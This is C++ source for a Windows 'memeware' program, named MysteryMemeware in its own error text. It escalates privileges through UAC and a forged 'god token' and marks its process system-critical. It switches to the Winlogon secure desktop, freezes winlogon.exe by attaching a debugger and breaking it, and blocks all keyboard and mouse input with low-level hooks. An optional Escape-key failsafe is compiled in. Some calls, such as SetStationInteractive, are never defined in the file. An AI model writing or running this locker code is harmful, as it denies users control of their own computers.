#include "MysteryControl.h"
#include "program.h"
#include "EzError.h"
#include "EzTokens.h"
#include "EzWindow.h"
#include <tlhelp32.h>
#include <sddl.h>

struct WinLogonContext {
	DWORD winLogonPID;
	HANDLE winLogonHandle;
};
static WinLogonContext winLogonContext = { };
static void DebugBreakWinLogon() {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(snapshot, &processEntry)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	do {
		if (lstrcmpW(processEntry.szExeFile, L"winlogon.exe") == 0) {
			winLogonContext.winLogonPID = processEntry.th32ProcessID;
			break;
		}
	} while (Process32Next(snapshot, &processEntry));

	if (!CloseHandle(snapshot)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (winLogonContext.winLogonPID == 0) {
		throw EzError(L"WinLogon.exe could not be found in the list of running processes.", __FILE__, __LINE__);
	}

	if (!DebugActiveProcess(winLogonContext.winLogonPID)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	winLogonContext.winLogonHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winLogonContext.winLogonPID);
	if (winLogonContext.winLogonHandle == INVALID_HANDLE_VALUE) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!DebugBreakProcess(winLogonContext.winLogonHandle)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}
static void DebugContinueWinLogon() {
	DEBUG_EVENT debugEvent = { };
	while (WaitForDebugEvent(&debugEvent, INFINITE)) {
		ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
	}

	if (!DebugActiveProcessStop(winLogonContext.winLogonPID)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	winLogonContext.winLogonPID = 0;

	if (!CloseHandle(winLogonContext.winLogonHandle)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	winLogonContext.winLogonHandle = INVALID_HANDLE_VALUE;
}

static HWINSTA currentStation = NULL;
static HDESK currentDesktop = NULL;
static void SetInteractive() {
	currentStation = EzGetActiveStation();
}
static HDESK SetDesktopInteractive() {
	/* NOTE
	OpenInputDesktop normally returns an HDESK to the interactive desktop
	unless the interactive desktop is the secure desktop in which case
	ERROR_INVALID_FUNCTION is returned instead.
	*/
	HDESK currentDesktop = OpenInputDesktop(0, FALSE, GENERIC_ALL);
	if (currentDesktop == NULL) {
		DWORD lastError = GetLastError();
		if (lastError == ERROR_INVALID_FUNCTION) {
			currentDesktop = OpenDesktop(L"Winlogon", 0, FALSE, GENERIC_ALL);
			if (currentDesktop == NULL) {
				EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
			}
		}
		else {
			EzError::ThrowFromCode(lastError, __FILE__, __LINE__);
		}
	}

	if (!SetThreadDesktop(currentDesktop)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	return currentDesktop;
}
static HDESK SetSecureDesktop() {
	HDESK secureDesktop = OpenDesktop(L"Winlogon", 0, FALSE, GENERIC_ALL);
	if (secureDesktop == NULL) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!SwitchDesktop(secureDesktop)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!SetThreadDesktop(secureDesktop)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	return secureDesktop;
}
static void FreeInteractivity() {
	if (!CloseWindowStation(currentStation)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!CloseDesktop(currentDesktop)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}

static HHOOK keyboardHook = NULL;
static HHOOK mouseHook = NULL;
static LRESULT CALLBACK BlockingHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}
static void SetLLInputHooks()
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockingHookProc, NULL, NULL);
	if (keyboardHook == NULL) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, BlockingHookProc, NULL, NULL);
	if (mouseHook == NULL) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}
static void UnsetLLInputHooks() {
	if (!UnhookWindowsHookEx(keyboardHook)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	keyboardHook = NULL;

	if (!UnhookWindowsHookEx(mouseHook)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	mouseHook = NULL;
}

#define FAILSAFE
#ifdef FAILSAFE
static LONGLONG failSafeTime = 0;
static void UpdateFailSafe() {
	if ((GetAsyncKeyState(VK_ESCAPE) & 0x8000) != 0) {
		if (failSafeTime == 0) {
			QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&failSafeTime));
		}
		else {
			LONGLONG timeNow = 0;
			QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));
			if (timeNow - failSafeTime > 10000000 * 10) {
				QuitRequested = TRUE;
			}
		}
	}
	else {
		failSafeTime = 0;
	}
}
#endif

BOOL InitMysteryControl() {
	HANDLE currentToken = EzOpenCurrentToken();
	EzEnableAllPrivileges(currentToken);

	BOOL isElevated = EzGetTokenElevation(currentToken);
	BOOL isGodToken = EzIsGodToken(currentToken);
	EzCloseHandleSafely(currentToken);

	if (!isElevated) {
		if (!EzLaunchWithUAC()) {
			throw EzError(L"The user declined the UAC. MysteryMemeware cannot proceed without elevation.", __FILE__, __LINE__);
		}
		return TRUE;
	}
	if (!isGodToken) {
		HANDLE godToken = EzCreateGodToken();
		EzLaunchAsToken(godToken);
		return TRUE;
	}

	EzSetSystemCritical(TRUE);

	currentStation = SetStationInteractive();
	currentDesktop = SetSecureDesktop();

	DebugBreakWinLogon();
	SetLLInputHooks();

	return FALSE;
}
void UpdateMysteryControl() {
#ifdef FAILSAFE
	UpdateFailSafe();
#endif

	EzMessagePumpAll();
}
void FreeMysteryControl() {
	SetSystemCritical(FALSE);

	UnsetLLInputHooks();

	DebugContinueWinLogon();

	FreeInteractivity();
}